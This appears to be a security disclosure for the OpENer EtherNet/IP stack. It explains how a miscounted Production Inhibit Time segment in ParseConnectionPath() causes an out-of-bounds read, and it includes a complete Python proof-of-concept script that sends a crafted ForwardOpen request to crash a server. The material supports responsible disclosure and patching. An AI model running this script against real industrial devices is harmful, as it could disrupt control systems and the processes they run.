@@ -1,0 +1,239 @@
+issue #571
+
+Summary
+
+A crafted EtherNet/IP ForwardOpen request can trigger a stack-based out-of-bounds read in OpENer's server-side connection-establishment path.
+
+The issue is in ParseConnectionPath() in source/src/cip/cipconnectionmanager.c. The connection path length is tracked in 16-bit words, but the trailing Production Inhibit Time in milliseconds network segment is incorrectly subtracted as 2 words even though the segment only consumes 2 bytes, i.e. 1 word.
+
+When this segment appears as the last word of the connection path, remaining_path underflows from 1 to a very large size_t value. The parser then continues the while (remaining_path > 0) loop and calls GetPathSegmentType() on a pointer that has already advanced past the end of the received TCP message buffer.
+
+With ASan/UBSan enabled, this results in a reproducible stack-buffer-overflow / READ of size 1 in GetPathSegmentType().
+
+Version
+
+OpENer v2.3 / master branch up to commit 76b95cf
+
+Root cause
+ParseConnectionPath() reads the connection path size as a word count:
+
+EipUint8 ParseConnectionPath(CipConnectionObject *connection_object,
+                             CipMessageRouterRequest *message_router_request,
+                             EipUint16 *extended_error) {
+  const EipUint8 *message = message_router_request->data;
+  const size_t connection_path_size = GetUsintFromMessage(&message); /* length in words */
+
+  if(0 == connection_path_size) {
+    return kEipStatusError;
+  }
+
+  size_t remaining_path = connection_path_size;
+  ...
+The length check also treats remaining_path as a number of 16-bit words:
+
+if( ( header_length + remaining_path * sizeof(CipWord) ) < message_router_request->request_data_size ) {
+  *extended_error = 0;
+  return kCipErrorTooMuchData;
+}
+
+if( ( header_length + remaining_path * sizeof(CipWord) ) > message_router_request->request_data_size ) {
+  *extended_error = 0;
+  OPENER_TRACE_INFO("Message not long enough for path\n");
+  return kCipErrorNotEnoughData;
+}
+Therefore, every 2 bytes consumed from the connection path should decrement remaining_path by 1.
+
+This is handled consistently in several other parts of the function. For example, simple data segments store their length in 16-bit words, and the code converts the payload length to bytes before subtracting the corresponding word count:
+
+case kDataSegmentSubtypeSimpleData:
+  g_config_data_length = message[1] * 2; /*data segments store length 16-bit word wise */
+  g_config_data_buffer = (EipUint8 *) message + 2;
+  remaining_path -= (g_config_data_length + 2) / 2;
+  message += (g_config_data_length + 2);
+  break;
+However, the trailing Production Inhibit Time in milliseconds network segment branch contains an inconsistent decrement:
+
+case kNetworkSegmentSubtypeProductionInhibitTimeInMilliseconds:
+  if(kConnectionObjectTransportClassTriggerProductionTriggerCyclic !=
+     ConnectionObjectGetTransportClassTriggerProductionTrigger(connection_object) ) {
+    /* only non cyclic connections may have a production inhibit */
+    connection_object->production_inhibit_time = message[1];
+    message += 2;
+    remaining_path -= 2;
+  } else {
+    *extended_error = connection_path_size - remaining_path;
+    return kCipErrorPathSegmentError;
+  }
+  break;
+The Production Inhibit Time in milliseconds segment only occupies 2 bytes:
+
+byte 0: network segment header
+byte 1: PIT value in milliseconds
+cipepath.c also treats the milliseconds PIT value as the second byte of the segment:
+
+CipUsint GetPathNetworkSegmentProductionInhibitTimeInMilliseconds(
+    const unsigned char *const cip_path) {
+  OPENER_ASSERT(kSegmentTypeNetworkSegment == GetPathSegmentType(cip_path) );
+  OPENER_ASSERT(kNetworkSegmentSubtypeProductionInhibitTimeInMilliseconds ==
+                GetPathNetworkSegmentSubtype(cip_path) );
+
+  return *(cip_path + 1);
+}
+So the correct accounting should be:
+
+message += 2;
+remaining_path -= 1;
+The current code instead performs:
+
+message += 2;
+remaining_path -= 2;
+This consumes 2 bytes but subtracts 2 words.
+
+PoC
+
+#!/usr/bin/env python3
+import os
+import socket
+import struct
+import sys
+
+
+PORT = 44818
+HOST = os.environ.get("OPENER_HOST", "127.0.0.1")
+
+BASE_PATH = bytes([0x20, 0x04, 0x24, 0x97, 0x2C, 0x96, 0x2C, 0x64])
+NONCYCLIC_TRIGGER = 0x11  # change-of-state + class 1
+
+
+def encap(command: int, session: int, payload: bytes, context: bytes) -> bytes:
+    return struct.pack("<HHII8sI", command, len(payload), session, 0, context, 0) + payload
+
+
+def register_session(sock: socket.socket) -> int:
+    request = encap(0x0065, 0, struct.pack("<HH", 1, 0), b"REGSESSN")
+    sock.sendall(request)
+    response = sock.recv(1024)
+    if len(response) < 8:
+        raise RuntimeError(f"short RegisterSession response: {response.hex()}")
+    return struct.unpack_from("<I", response, 4)[0]
+
+
+def wrap_send_rr_data(session: int, cip: bytes, context: bytes) -> bytes:
+    cpf = struct.pack(
+        "<IHHHHHH",
+        0,      # interface handle
+        0,      # timeout
+        2,      # item count
+        0x0000, # Null Address Item
+        0x0000, # Null Address length
+        0x00B2, # Unconnected Data Item
+        len(cip),
+    ) + cip
+    return encap(0x006F, session, cpf, context)
+
+
+def build_forward_open(path_bytes: bytes, connection_id: int, produced_id: int,
+                       serial: int, originator_serial: int) -> bytes:
+    cip = bytes([0x54, 0x02, 0x20, 0x06, 0x24, 0x01])
+    cip += struct.pack(
+        "<BBIIHHIB3xIHIHB",
+        0x0A,              # priority/tick
+        0x0E,              # timeout ticks
+        connection_id,     # O->T connection ID
+        produced_id,       # T->O connection ID
+        serial,            # connection serial
+        0x4321,            # vendor ID
+        originator_serial, # originator serial
+        0x01,              # timeout multiplier
+        100000,            # O->T RPI
+        0x4026,            # O->T point-to-point, fixed, size 38
+        100000,            # T->O RPI
+        0x4022,            # T->O point-to-point, fixed, size 34
+        NONCYCLIC_TRIGGER,
+    )
+    cip += struct.pack("<B", len(path_bytes) // 2)
+    cip += path_bytes
+    return cip
+
+
+def build_path(mode: str) -> bytes:
+    if mode == "baseline":
+        return BASE_PATH
+
+    filler_words = 209
+    filler = b"B" * (filler_words * 2)
+    path = BASE_PATH + bytes([0x80, filler_words]) + filler
+
+    if mode == "filler":
+        return path
+    if mode == "crash":
+        path += bytes([0x43, 0x01])  # PIT in milliseconds
+        if len(path) != 430:
+            raise RuntimeError(f"unexpected crash path length: {len(path)}")
+        return path
+
+    raise ValueError(mode)
+
+
+def parse_mr_reply(response: bytes) -> None:
+    if not response:
+        print("response=timeout")
+        return
+
+    offset = 24 + 6 + 2 + 4 + 4
+    mr = response[offset:]
+    if len(mr) < 4:
+        print(f"response={response.hex()}")
+        return
+
+    reply_service, _reserved, general_status, add_status_size = mr[:4]
+    pos = 4
+    add_status = []
+    for _ in range(add_status_size):
+        add_status.append(struct.unpack_from("<H", mr, pos)[0])
+        pos += 2
+
+    print(
+        f"reply_service=0x{reply_service:02x} general_status=0x{general_status:02x} "
+        f"additional_status={add_status} payload={mr[pos:].hex()}"
+    )
+
+
+def main() -> int:
+    mode = sys.argv[1] if len(sys.argv) > 1 else "crash"
+    host = sys.argv[2] if len(sys.argv) > 2 else HOST
+    if mode not in {"baseline", "filler", "crash"}:
+        print(f"usage: {sys.argv[0]} [baseline|filler|crash] [host]", file=sys.stderr)
+        return 2
+
+    path = build_path(mode)
+    params = {
+        "baseline": (0x11111111, 0x22222222, 0x1234, 0xCAFEBABE, b"PITBASE!"),
+        "filler":   (0x77777777, 0x88888888, 0x4567, 0x01020304, b"FILLER!!"),
+        "crash":    (0x55555555, 0x66666666, 0x3456, 0xD0C0B0A0, b"PIT512!!"),
+    }[mode]
+    cip = build_forward_open(path, params[0], params[1], params[2], params[3])
+    packet = wrap_send_rr_data(0, cip, params[4])
+
+    print(
+        f"mode={mode} host={host} path_len={len(path)} path_words={len(path) // 2} "
+        f"cip_len={len(cip)} packet_len={len(packet)}"
+    )
+
+    with socket.create_connection((host, PORT), timeout=3.0) as sock:
+        session = register_session(sock)
+        print(f"session={session}")
+        packet = wrap_send_rr_data(session, cip, params[4])
+        sock.sendall(packet)
+        sock.settimeout(1.0)
+        try:
+            response = sock.recv(4096)
+        except socket.timeout:
+            response = b""
+
+    parse_mr_reply(response)
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
